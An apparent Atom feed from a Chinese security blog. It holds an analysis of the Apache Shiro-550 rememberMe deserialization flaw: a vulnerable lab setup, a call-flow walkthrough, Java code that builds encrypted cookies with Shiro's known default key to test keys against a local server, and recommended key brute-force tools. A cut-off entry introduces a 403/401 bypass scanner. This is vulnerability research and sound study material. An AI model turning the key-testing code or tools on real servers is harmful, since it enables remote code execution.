<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>像清水一般清澈透明</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://summersec.github.io/"/>
  <updated>2021-01-22T11:19:36.323Z</updated>
  <id>https://summersec.github.io/</id>
  
  <author>
    <name>Samny</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Shiro-550反序列化漏洞分析</title>
    <link href="https://summersec.github.io/2021/03/21/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://summersec.github.io/2021/03/21/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-03-21T11:01:42.000Z</published>
    <updated>2021-01-22T11:19:36.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp; Shiro反序列化漏洞目前为止有两个，Shiro-550<code>(Apache  Shiro &lt; 1.2.5)</code>和Shiro-721<code>( Apache  Shiro &lt; 1.4.2 )</code>。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用<code>登录后rememberMe={value}去爆破正确的key值</code>进而反序列化，对比Shiro550条件只要有<code>足够密钥库</code>（条件比较低）、Shiro721需要登录（要求比较高<del>鸡肋</del>）。</p><ul><li><code>Apache Shiro &lt; 1.4.2</code>默认使用<code>AES/CBC/PKCS5Padding</code>模式</li><li><code>Apache Shiro &gt;= 1.4.2</code>默认使用<code>AES/GCM/PKCS5Padding</code>模式</li></ul><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>&emsp;&emsp; 采用Maven仓库的形式，源码放在<a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">GitHub</a>上，直接用Idea打开即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-deser<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        hutool是一款十分强大工具库--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        官网地址 https://www.hutool.cn/--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--         添加commons-collections依赖作为 payload--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;commons-collections&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;version&gt;4.0&lt;/version&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        // debug参数</span><br><span class="line">            <span class="tag">&lt;<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">                -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=5005</span><br><span class="line">            <span class="tag">&lt;/<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line">`</span><br></pre></td></tr></table></figure><hr><h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><ul><li><p>调用org\apache\shiro\mgt\DefaultSecurityManager.class#resolvePrincipals方法<code>获取remember凭证</code></p><p><img src="https://img-blog.csdnimg.cn/20210120170900332.png" alt="在这里插入图片描述"></p></li><li><p>DefaultSecurityManager.class#getRememberedIdentity调用方法<code>获取rememberMe认证的序列化数据</code><br><img src="https://img-blog.csdnimg.cn/20210120170957673.png" alt="在这里插入图片描述"></p></li><li><p>接着调用父类org\apache\shiro\mgt\AbstractRememberMeManager.class#getRememberedPrincipals方法在122行调用<code>getRememberedSerializedIdentity</code>方法获取cookie中的值<br><img src="https://img-blog.csdnimg.cn/20210120171218140.png" alt="在这里插入图片描述"></p></li><li><p>然后来到org\apache\shiro\web\mgt\CookieRememberMeManager.class#getRememberedSerializedIdentity获取cookie值之后，先判断一下是否为空和<code>deleteMe</code>，解之Base64解码最后在95行处返回byte[]值<br><img src="https://img-blog.csdnimg.cn/20210122145845874.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210122150020874.png" alt="在这里插入图片描述"></p></li><li><p>org\apache\shiro\mgt\AbstractRememberMeManager.class#getRememberedPrincipals方法的124行进行类型转化，类型转化的过程中会进行AES解密操作，进而作为反序列化的数据<br><img src="https://img-blog.csdnimg.cn/20210122150415517.png" alt="在这里插入图片描述"></p></li><li><p>AbstractRememberMeManager.class#convertBytesToPrincipals进行AES解密操作，最后调用反序列化方法，将数据反序列化，导致反序列化漏洞<br><img src="https://img-blog.csdnimg.cn/20210122150613761.png" alt="在这里插入图片描述"></p></li><li><p>AbstractRememberMeManager#decrypt方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>查看bytes数据值，可以看到解密后是生成的恶意payload</p><p><img src="https://img-blog.csdnimg.cn/20210122151026506.png" alt="在这里插入图片描述"></p></li><li><p>完整的payload演示效果<br>  <img src="https://img-blog.csdnimg.cn/20210122191831440.gif" alt="在这里插入图片描述"></p></li></ul><hr><h1 id="Shiro‘s-key爆破方式"><a href="#Shiro‘s-key爆破方式" class="headerlink" title="Shiro‘s key爆破方式"></a>Shiro‘s key爆破方式</h1><h2 id="基于原生shiro框架检测方式"><a href="#基于原生shiro框架检测方式" class="headerlink" title="基于原生shiro框架检测方式"></a>基于原生shiro框架检测方式</h2><p>l1nk3r师傅的检测思路地址: <a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a><br>关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SimplePrincipalCollection simplePrincipalCollection = <span class="keyword">new</span> SimplePrincipalCollection();</span><br><span class="line">       ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"payload"</span>));</span><br><span class="line">       obj.writeObject(simplePrincipalCollection);</span><br><span class="line">       obj.close();</span><br></pre></td></tr></table></figure><p>实现具体代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 正确key</span></span><br><span class="line">        String realkey = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>;</span><br><span class="line">        <span class="comment">// 错误key</span></span><br><span class="line">        String errorkey = <span class="string">"2AvVhdsgUs0FSA3SDFAdag=="</span>;</span><br><span class="line">        <span class="comment">// 序列化文件路径</span></span><br><span class="line">        String filepath = <span class="string">"E:\\Soures\\JavaLearnVulnerability\\shiro\\shiro-deser\\key"</span>;</span><br><span class="line"></span><br><span class="line">        SimplePrincipalCollection simplePrincipalCollection = <span class="keyword">new</span> SimplePrincipalCollection();</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(filepath));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 写入序列化数据</span></span><br><span class="line">            obj.writeObject(simplePrincipalCollection);</span><br><span class="line">            obj.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        FileReader fileReader = <span class="keyword">new</span> FileReader(filepath);</span><br><span class="line"></span><br><span class="line">        CbcEncrypt cbcEncrypt = <span class="keyword">new</span> CbcEncrypt();</span><br><span class="line">        String realcookie = <span class="string">"rememberMe="</span> + cbcEncrypt.encrypt(realkey,fileReader.readBytes());</span><br><span class="line">        String errorcookie = <span class="string">"rememberMe="</span> + cbcEncrypt.encrypt(errorkey,fileReader.readBytes());</span><br><span class="line">        System.out.println(<span class="string">"realcookie --&gt; "</span> + realcookie);</span><br><span class="line">        System.out.println(<span class="string">"errorcookie --&gt; "</span> + errorcookie);</span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8001/index"</span>;</span><br><span class="line">        <span class="comment">// 发送请求包，获取返回包</span></span><br><span class="line">        HttpResponse realresponse = HttpRequest.get(url).cookie(realcookie).execute();</span><br><span class="line">        HttpResponse errorresponse = HttpRequest.get(url).cookie(errorcookie).execute();</span><br><span class="line">        String result1 = realresponse.header(Header.SET_COOKIE);</span><br><span class="line">        String result2 = errorresponse.header(Header.SET_COOKIE);</span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(<span class="string">"realkey ---&gt; "</span> + result1);</span><br><span class="line">        System.out.println(<span class="string">"errorkey ---&gt; "</span> + result2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210122190937627.png" alt="在这里插入图片描述"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; Gadget Chian 如下。简单来说流程就是将生成恶意Payload进行AES加密，然后Base64编码，然后以<code>rememberMe={value}</code>形式发送给服务器。服务器将<code>value</code>Base64解码，然后将解码后数据进行AES解密，最后反序列化执行命令。<br>&emsp;&emsp; Shiro721在登录之后，用登录后服务器生成rememberMe的值进行Base64解码之后，用解码数据，再通过<code>Padding Oracle Attack</code>进行爆破得到key具体参考<a href="https://paper.seebug.org/1378/#412-apache-shiro-padding-oracle-attack" target="_blank" rel="noopener">Shiro 组件漏洞与攻击链分析</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*                  Gadget chian:</span><br><span class="line">*                      DefaultSecurityManager.resolvePrincipals()</span><br><span class="line">*                          DefaultSecurityManager.getRememberedIdentity()</span><br><span class="line">*                              AbstractRememberMeManager.getRememberedPrincipals()</span><br><span class="line">*                                  CookieRememberMeManager#getRememberedSerializedIdentity()</span><br><span class="line">*                                      AbstractRememberMeManager#getRememberedPrincipals()</span><br><span class="line">*                                          AbstractRememberMeManager.convertBytesToPrincipals()</span><br><span class="line">*                                              AbstractRememberMeManager.decrypt()</span><br><span class="line">*                                                  AbstractRememberMeManager.deserialize()</span><br><span class="line">*                                                      .....................</span><br><span class="line">*                                                               ..........</span><br><span class="line">*  </span><br><span class="line">*</span><br></pre></td></tr></table></figure><hr><h2 id="Shiro实用工具推荐"><a href="#Shiro实用工具推荐" class="headerlink" title="Shiro实用工具推荐"></a>Shiro实用工具推荐</h2><ul><li><a href="https://github.com/j1anFen/shiro_attack" target="_blank" rel="noopener">shiro_attack</a> 推荐理由：javafx写的UI，支持tomcat全版本回显和Spring Boot回显。使用<code>SimplePrincipalCollection</code>爆破key，支持高版本加密方式爆破（GCM模式）项目还在维护。<br><img src="https://img-blog.csdnimg.cn/20210122183413881.png" alt></li></ul><hr><ul><li><a href="https://github.com/pmiaowu/BurpShiroPassiveScan" target="_blank" rel="noopener">BurpShiroPassiveScan</a>是一款burp插件，被动式扫描，自动识别是否为shiro框架，支持CBC/GCM两种加密方式，同时默认使用<code>SimplePrincipalCollection</code>爆破key，项目在维护。<br><img src="https://img-blog.csdnimg.cn/2021012218384769.png" alt="在这里插入图片描述"></li></ul><hr><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><h3 id="编码不一致问题"><a href="#编码不一致问题" class="headerlink" title="编码不一致问题"></a>编码不一致问题</h3><p>由于Windows cmd的编码是gdk，导致读取cmd内容的时候会<code>aced0005</code>变成<code>efbfbdefbfbd</code>，导致无法反序列化。<br><img src="https://img-blog.csdnimg.cn/20210120125258810.png" alt="在这里插入图片描述"><br>解决办法将生成的payload导入文件之中，然后读取二进制数据。<br><img src="https://img-blog.csdnimg.cn/20210122171101605.png" alt="在这里插入图片描述"></p><hr><h2 id="课外知识补充"><a href="#课外知识补充" class="headerlink" title="课外知识补充"></a>课外知识补充</h2><h3 id="springboot-debug技巧"><a href="#springboot-debug技巧" class="headerlink" title="springboot debug技巧"></a>springboot debug技巧</h3><p>在配置中VM options 输入<code>-Xms512m -Xmx512m -Xmn164m -XX:MaxPermSize=250m -XX:ReservedCodeCacheSize=64m -Dserver.port=8001 -ea</code><br><img src="https://img-blog.csdnimg.cn/202101221712423.png" alt="在这里插入图片描述"><br>同时在配置文件pom.xml加入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">        &lt;configuration&gt;</span><br><span class="line">            &lt;jvmArguments&gt;</span><br><span class="line">                -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=<span class="number">5005</span></span><br><span class="line">            &lt;/jvmArguments&gt;</span><br><span class="line">        &lt;/configuration&gt;</span><br><span class="line">    &lt;/plugin&gt;</span><br></pre></td></tr></table></figure><h3 id="VScode添加插件"><a href="#VScode添加插件" class="headerlink" title="VScode添加插件"></a>VScode添加插件</h3><p>Hex Editor插件</p><p><img src="https://img-blog.csdnimg.cn/20210122171520346.png" alt="在这里插入图片描述"><br>效果如下<br><img src="https://img-blog.csdnimg.cn/20210122171541915.png" alt="在这里插入图片描述"></p><h3 id="Git-自带-xxd工具"><a href="#Git-自带-xxd工具" class="headerlink" title="Git 自带 xxd工具"></a>Git 自带 xxd工具</h3><p>将工具路径加入环境变量<br><img src="https://img-blog.csdnimg.cn/20210122171754706.png" alt="在这里插入图片描述"><br>效果如下：</p><p><img src="https://img-blog.csdnimg.cn/20210122172003896.png" alt="在这里插入图片描述"></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a><br><a href="https://paper.seebug.org/1378" target="_blank" rel="noopener">https://paper.seebug.org/1378</a><br><a href="https://ares-x.com/2020/10/26/Shiro%E9%AB%98%E7%89%88%E6%9C%AC%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://ares-x.com/2020/10/26/Shiro%E9%AB%98%E7%89%88%E6%9C%AC%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a><br><a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Shiro反序列化漏洞目前为止有两个，Shiro-550&lt;code&gt;(Apache  Shiro &amp;lt; 1.2
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java 反序列化" scheme="https://summersec.github.io/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>BypassSuper使用介绍说明</title>
    <link href="https://summersec.github.io/2021/02/05/BypassSuper%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"/>
    <id>https://summersec.github.io/2021/02/05/BypassSuper%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/</id>
    <published>2021-02-05T00:22:16.000Z</published>
    <updated>2021-01-22T12:15:07.687Z</updated>
    
    <content type="html"><![CDATA[<h1 align="center">BypassSuper</h1><h3 align="center">一款针对403/401页面进行快速、高效尝试Bypass的扫描工具</h3> <p align="center">    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="BypassSuper" src="https://img.shields.io/badge/python-3.X-blueviolet"></a>    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="BypassSuper" src="https://img.shields.io/badge/Bypass-Super-green"></a>    <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Forks" src="https://img.shields.io/github/forks/SummerSec/BypassSuper"></a>     <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Release" src="https://img.shields.io/github/release/SummerSec/BypassSuper.svg"></a>  <a href="https://github.com/SummerSec/BypassSuper" target="_blank" rel="noopener"><img alt="Stars" src="https://img.shields.io/github/stars/SummerSec/BypassSuper.svg?style=social&label=Stars"></a>     <a href="https://github.com/SummerSec" target="_blank" rel="noopener"><img alt="Follower" src="https://img.shields.io/github/followers/SummerSec.svg?style=social&label=Follow"></a>    <a href="https://twitter.com/SecSummers" target="_blank" rel="noopener"><img alt="SecSummers" src="https://img.shields.io/twitter/follow/SecSummers.svg"></a>    <a xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://visitor-badge.laobi.icu" target="_blank" rel="noopener"><rect fill="rgba(0,0,0,0)" height="20" 